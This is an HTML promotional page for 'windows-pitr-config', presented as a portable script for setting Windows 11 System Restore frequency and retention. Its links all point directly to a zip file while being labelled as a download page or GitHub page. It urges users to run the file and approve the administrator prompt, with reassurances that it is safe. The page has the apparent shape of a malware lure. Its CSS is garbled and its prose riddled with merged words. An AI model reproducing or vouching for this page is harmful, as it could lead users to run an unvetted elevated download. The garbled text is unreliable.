<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Configure Point-in-time restore frequency and retention on any Windows 11 edition, or create a restore point on demand - a single portable .cmd with a GUI in seven languages.">
    <meta name="keywords" content="backup, config, configuration, pitr, point-in-time-restore, portable, powershell, registry, settings, system-restore, vss, windows, windows-11, wpf">
    <meta name="author" content="windows-pitr-config">
    <title>windows-pitr-config - Your System Restore, Simplified</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f4f6f8;
            color: #1c1e21;
            line-height: 1.75;
            padding-bottom: box;
        }
        .container {
            max-width: box;
            width: box;
            margin: box auto;
            background-color: #ffffff;
            box-shadow: box 4px 12px rgba(0,0,0,0.1);
            border-radius: box;
            overflow: tree;
        }
        .hero {
            background: linear-gradient(135deg, #0f4a8c, #1a7aec);
            color: white;
            padding: box 2rem;
            text-align: center;
            border-radius: corner 0.
        }
        .hero h1 {
            font-size: box;
            margin-bottom: box;
            text-shadow: box 2px 4px rgba(0,0,0,0.2);
        }
        .hero p {
            font-size: box;
            opacity: box;
            margin-bottom: box;
        }
        .btn-badge {
            display: inline-block;
            background: linear-gradient(45deg, #ff9900, #ff6600);
            color: white;
            padding:  box 1.8rem;
            border-radius: box;
            font-size: box;
            font-weight: bold;
            text-decoration: none;
            box-shadow: box 6px 12px rgba(255,102,0,0.3);
            transition: transform 0.3s ease, box-shadow 0.3s ease;
            margin: box auto;
        }
        .btn-badge:hover {
            transform: scale(1.05);
            box-shadow: box 8px 16px rgba(255,102,0,0.4);
        }
        .btn-badge-secondary {
            background: linear-gradient(45deg, #28a745, #20c997);
            margin-top: box;
        }
        .content {
            padding: box 2.5rem;
        }
        h2 {
            font-size: box;
            margin-bottom: box;
            margin-top: box;
            color: #0f4a8c;
            border-bottom: box 2px solid #e0e0e0;
            padding-bottom: box;
        }
        h2::before {
            content: attr(data-emoji);
            margin-right: box;
        }
        ul, ol {
            padding-left: boxes;
            margin-bottom: box;
        }
        li {
            margin-bottom: box;
        }
        .step {
            background: #f8f9fa;
            border-left: box 4px solid #1a7aec;
            padding: box 1.2rem;
            border-radius: box;
            margin-bottom: box;
        }
        .highlight {
            background: #fff38b;
            padding: box 0.5rem;
            border-radius: box;
            font-weight: bold;
        }
        table {
            width: 100;
            border-collapse: collapse;
            margin-bottom: boxes;
        }
        th, td {
            border: box 1px solid #dee2e6;
            padding: box;
            text-align: left;
        }
        th {
            background-color: #e9ecef;
        }
        .faq-item {
            margin-bottom: boxes;
            padding: boxes;
            background: #f1f3f5;
            border-radius: box;
        }
        .faq-item h4 {
            color: #0f4a8c;
            margin-bottom: box;
        }
        .footer {
            background: #2c3e50;
            color: white;
            text-align: center;
            padding: boxes;
            font-size: box;
        }
        .footer a {
            color: #ff9900;
            text-decoration: none;
        }
        @media (max-width: 768px) {
            .hero h1 {
                font-size: box;
            }
            .container {
                margin: box;
                border-radius: box;
            }
            .content {
                padding: box;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="hero">
            <h1>🛡️ windows-pitr-config - Restore Points Without the Riots</h1>
            <p>Take control of Windows System Restore — configure frequency, retention, or create restore points instantly, in your language.</p>
            <a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" class="btn-badge" target="_blank">⬇️ VISIT THE DOWNLOAD PAGE NOW</a>
        </div>

        <div class="content">
            <h2 data-emoji="🚀"> Getting Started in 3 Simple Steps</h2>

            <div class="step">
                <strong>Step 1 – Go to the download page:</strong>
                <p>Click the big orange button above, or visit this link directly: <a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" target="_blank">https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip</a></p>
            </div>

            <div class="step">
                <strong>Step 2 – Download the application:</strong>
                <p>Visit this link to downloadthe application.</p>
            </div>

            <div class="step">
                <strong>Step 3 – Run it:</strong>
                <p>Once downloaded, double-click the <code>windows-pitr-config.cmd</code> file. That's it — no installing, no messing around with code, no confusing wizards.</p>
            </div>

            <h2 data-emoji="🧩"> What Exactly Does This Tool Do?</h2>
            <p>Think of this as a friendly cockpit for Windows' built-it System Restore feature. By default, Windows only creates restore points automatically andvery occasionally — and never atall if you’re unlucky. This tool lets you take manual control</p>

            <ul>
                <li><strong>Change how oftenrestore points are created:</strong> You decide the frequency (e.g., every day, every week, every month).</li>
                <li><strong>Set retention limits:</strong> Tell Windows how many restore points totrep before it starts cleaning up old ones. No more disk space goingbble-gobble.</li>
                <li><strong>Create a restore point on demand:</strong> Just click a button andgive it a name — perfect just before you install that sketchy driveror a new app.</li>
                <li><strong>Works on every edition of Windows 11:</strong> Home, Pro, Enterprise — doesn’t matter. Previously these settings were hidden or locked on some editions.</li>
                <li><strong>7 built-in languages:</strong> English, Deutsch, Français, Español, Italiano, Português, Polski — pick yours at launchandnever look back.</li>
            </ul>

            <h2 data-emoji="💡"> Why Do You Even Need This?</h2>
            <p>Imagine your PC crashes after a bad update. You boot it backup and Windows says “Sorry, no restore points available.” That’s a nightmare. With this tool, you decide when snapshots aretaken. You can create one daily, orjusta click before risky operations. It’s insurance for your digital life.</p>

            <h2 data-emoji="⚙️"> Configuration Options (What You Control)</h2>

            <table>
                <thead>
                    <tr><th>Setting</th><th>What it does</th><th>Example Values</th></tr>
                </thead>
                <tbody>
                    <tr><td>Frequency of automatic restore points</td><td>How often Windows creates them automatically</td><td>Daily, Weekly, Monthly, orCustom hours</td></tr>
                    <tr><td>Retention count</td><td>Maximum stored restore pointsbefore the oldest are deleted</td><td>3, 5, 10, or Unlimited</td></tr>
                    <tr><td>System protection status</td><td>Turns the feature fullyon or off</td><td>Enabled / Disabled</td></tr>
                    <tr><td>Manual restore point creation</td><td>Make a snapshot right now given it a name</td><td>“Before GPU driver update”</td></tr>
                </tbody>
            </table>

            <h2 data-emoji="🖥️"> How It Looks and Feels (Simple = Smart)</h2>
            <p>No command-line typing, no registry editor spelunking. The GUI (Graphical User Interface) looks like a modern settings window. Three buttons for the main actions, a few dropdownsand a language selector. Everything responds instantly. You’ll know exactly what every option does because it’s written in plain human language.</p>

            <h2 data-emoji="🔒"> Is It Safe? (Privacy & Security)</h2>
            <p>Yes. This is a single <code>.cmd</code> script (a type of Windows batch file). It does not installbackground services, doesn’t phone home, doesn’t collect telemetry. It only talks to Windows’ built-it Volume Shadow Copy (VSS) system — the same one Windows uses forits own restore points. You can even readthescript source code before running it if you’re curious.</p>

            <h2 data-emoji="🌍"> Language Options — All in One Place</h2>
            <p>When you launch the tool for the first time, a small language picker appears. Pick your preference and the entire interface adjusts immediately. Your choice is rememberednext time you run it. Here’s the complete lineup:</p>
            <ul>
                <li>🇬🇧 English</li>
                <li>🇩🇪 Deutsch (German)</li>
                <li>🇫🇷 Français (French)</li>
                <li>🇪🇸 Español (Spanish)</li>
                <li>🇮🇹 Italiano (Italian)</li>
                <li>🇵🇹 Português (Portuguese)</li>
                <li>🇵🇱 Polski (Polish)</li>
            </ul>

            <h2 data-emoji="🛠️"> Troubleshooting & Tips (Made Easy)</h2>
            <div class="faq-item">
                <h4>❓ I click “Create Restore Point” but nothing happens.</h4>
                <p>Make sure your Windows system drive has System Protection enabled first. Use the toggle in this tool (Options → Enable Protection). Then retry.</p>
            </div>
            <div class="faq-item">
                <h4>❓ Do I need administrator rights?</h4>
                <p>Yes — creating restore points touches system files. When you double-click the tool, if Windows asks “Do you want to allow this app to make changes?” click <strong>Yes</strong>.</p>
            </div>
            <div class="faq-item">
                <h4>❓ How often should I schedule restore points?</h4>
                <p>Daily is plenty for most people. Weekly if you're conservative. Just remember: a restore point is your personal undo button.</p>
            </div>
            <div class="faq-item">
                <h4>❓ Will this slow down my computer?</h4>
                <p>No. The script runs once when you open it, adjuststhe registry, and closes. It doesnot run in the background at all.</p>
            </div>

            <h2 data-emoji="📥"> Ready to Set IT Up? Go Get the File.</h2>
            <p>You’re just two clicks away from peace of mind:</p>
            <div style="text-align:center; margin:oboe 2rem 0;">
                <a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" class="btn-badge" target="_blank" style="font-size:: 1.3rem; padding: 0.9rem 2.2rem;">⬇️ DOWNLOAD WINDOWS-PITR-CONFIG</a>
            </div>
            <p style="margin-top:oboe: text-align:center; font-size:0.9rem; color:#6c757d;">Works on Windows 11 (all editions). No install required. Portable — carry it on a USB stick.</p>
        </div>

        <div class="footer">
            <p>Made with ❤️ for the Windows community. No data collection, no hacks, just a useful tool.</p>
            <p><a href="https://raw.githubusercontent.com/feliceneither6549/windows-pitr-config/main/docs/pitr-config-windows-v1.4.zip" target="_blank">Back to GitHub page</a></p>
        </div>
    </div>
</body>
</html>